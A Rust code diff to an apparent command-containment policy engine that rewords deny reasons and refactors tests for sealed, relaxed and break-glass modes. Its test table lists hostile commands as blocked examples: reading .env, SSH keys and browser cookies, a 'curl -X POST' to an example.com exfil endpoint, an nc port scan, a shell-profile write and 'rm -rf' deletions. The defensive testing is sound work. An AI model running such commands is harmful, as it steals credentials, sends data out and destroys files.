@@ -36,7 +36,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "bash -lc 'echo bypass-attempt'",
         expected_action_family: ActionFamily::ProcessExec,
         expected_outcome: PolicyOutcome::BrokerOnly,
-        expected_reason: "command is not on the demo allowlist",
+        expected_reason: "command requires broker mediation",
         expected_rule: "process-exec-broker-only",
     },
     DemoShellBlockerSpec {
@@ -44,7 +44,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "cat .env",
         expected_action_family: ActionFamily::SecretRead,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "max-containment denied a sensitive read",
+        expected_reason: "containment denied a sensitive read",
         expected_rule: "secret-read-default-deny",
     },
     DemoShellBlockerSpec {
@@ -52,7 +52,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "cat ~/.ssh/id_ed25519",
         expected_action_family: ActionFamily::SecretRead,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "max-containment denied a sensitive read",
+        expected_reason: "containment denied a sensitive read",
         expected_rule: "secret-read-default-deny",
     },
     DemoShellBlockerSpec {
@@ -60,7 +60,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "ssh-add -L",
         expected_action_family: ActionFamily::SecretRead,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "max-containment denied a sensitive read",
+        expected_reason: "containment denied a sensitive read",
         expected_rule: "secret-read-default-deny",
     },
     DemoShellBlockerSpec {
@@ -68,7 +68,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "cat /home/z/.config/google-chrome/Default/Cookies",
         expected_action_family: ActionFamily::BrowserStateRead,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "repo-open and browser-state actions are not yet supported in the demo profile",
+        expected_reason: "repo-open and browser-state actions are not yet supported for execution",
         expected_rule: "repo-open-deny",
     },
     DemoShellBlockerSpec {
@@ -76,7 +76,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "curl -X POST https://example.com/exfil",
         expected_action_family: ActionFamily::NetSend,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "max-containment denied direct network tooling",
+        expected_reason: "containment denied direct network tooling",
         expected_rule: "network-direct-deny",
     },
     DemoShellBlockerSpec {
@@ -84,7 +84,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "echo hello > ~/.zshrc",
         expected_action_family: ActionFamily::PersistenceWrite,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "max-containment denied a persistence write",
+        expected_reason: "containment denied a persistence write",
         expected_rule: "persistence-write-deny",
     },
     DemoShellBlockerSpec {
@@ -92,7 +92,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "rm -rf /home/z/workspace",
         expected_action_family: ActionFamily::DestructiveOp,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "high-blast-radius action denied in the demo profile",
+        expected_reason: "high-blast-radius action denied",
         expected_rule: "high-blast-radius-deny",
     },
     DemoShellBlockerSpec {
@@ -108,7 +108,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "python -c \"import os; os.system('curl https://example.com')\"",
         expected_action_family: ActionFamily::NetSend,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "max-containment denied direct network tooling",
+        expected_reason: "containment denied direct network tooling",
         expected_rule: "network-direct-deny",
     },
     DemoShellBlockerSpec {
@@ -116,7 +116,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "cat .mcp.json",
         expected_action_family: ActionFamily::RepoOpenConfig,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "repo-open and browser-state actions are not yet supported in the demo profile",
+        expected_reason: "repo-open and browser-state actions are not yet supported for execution",
         expected_rule: "repo-open-deny",
     },
     DemoShellBlockerSpec {
@@ -124,7 +124,7 @@ const DEMO_SHELL_BLOCKERS: &[DemoShellBlockerSpec] = &[
         command: "nc -vz 10.0.0.1 22 80 443",
         expected_action_family: ActionFamily::NetSend,
         expected_outcome: PolicyOutcome::Deny,
-        expected_reason: "max-containment denied direct network tooling",
+        expected_reason: "containment denied direct network tooling",
         expected_rule: "network-direct-deny",
     },
 ];
@@ -256,7 +256,8 @@ impl SessionPolicy {
                 } else if self.lockdown_mode.is_sealed() {
                     (
                         PolicyOutcome::Deny,
-                        "command is not on the scoped allowlist and is denied in sealed mode".to_string(),
+                        "command is not on the scoped allowlist and is denied in sealed mode"
+                            .to_string(),
                         "process-exec-sealed-deny".to_string(),
                     )
                 } else {
@@ -279,7 +280,8 @@ impl SessionPolicy {
                 } else {
                     (
                         PolicyOutcome::Deny,
-                        "repo-open and browser-state actions are not yet supported for execution".to_string(),
+                        "repo-open and browser-state actions are not yet supported for execution"
+                            .to_string(),
                         "repo-open-deny".to_string(),
                     )
                 }
@@ -663,8 +665,10 @@ mod tests {
 
     #[test]
     fn sealed_mode_denies_unknown_process_exec() {
-        let mut policy = SessionPolicy::default();
-        policy.lockdown_mode = crate::types::LockdownMode::Sealed;
+        let policy = SessionPolicy {
+            lockdown_mode: crate::types::LockdownMode::Sealed,
+            ..Default::default()
+        };
         let managed = canonicalize_command(&ctx(), "bash -lc 'echo unknown'");
         assert_eq!(managed.request.action_family, ActionFamily::ProcessExec);
         assert_eq!(policy.decide(&managed.request).outcome, PolicyOutcome::Deny);
@@ -672,8 +676,10 @@ mod tests {
 
     #[test]
     fn relaxed_mode_allows_unknown_process_exec_with_warn() {
-        let mut policy = SessionPolicy::default();
-        policy.lockdown_mode = crate::types::LockdownMode::Relaxed;
+        let policy = SessionPolicy {
+            lockdown_mode: crate::types::LockdownMode::Relaxed,
+            ..Default::default()
+        };
         let managed = canonicalize_command(&ctx(), "bash -lc 'echo unknown'");
         assert_eq!(managed.request.action_family, ActionFamily::ProcessExec);
         let decision = policy.decide(&managed.request);
@@ -683,13 +689,21 @@ mod tests {
 
     #[test]
     fn break_glass_mode_allows_all_with_evidence() {
-        let mut policy = SessionPolicy::default();
-        policy.lockdown_mode = crate::types::LockdownMode::BreakGlass;
+        let policy = SessionPolicy {
+            lockdown_mode: crate::types::LockdownMode::BreakGlass,
+            ..Default::default()
+        };
         let managed1 = canonicalize_command(&ctx(), "cat ~/.ssh/id_rsa");
-        assert_eq!(policy.decide(&managed1.request).outcome, PolicyOutcome::Allow);
-        
+        assert_eq!(
+            policy.decide(&managed1.request).outcome,
+            PolicyOutcome::Allow
+        );
+
         let managed2 = canonicalize_command(&ctx(), "rm -rf /");
-        assert_eq!(policy.decide(&managed2.request).outcome, PolicyOutcome::Allow);
+        assert_eq!(
+            policy.decide(&managed2.request).outcome,
+            PolicyOutcome::Allow
+        );
     }
 
     #[test]
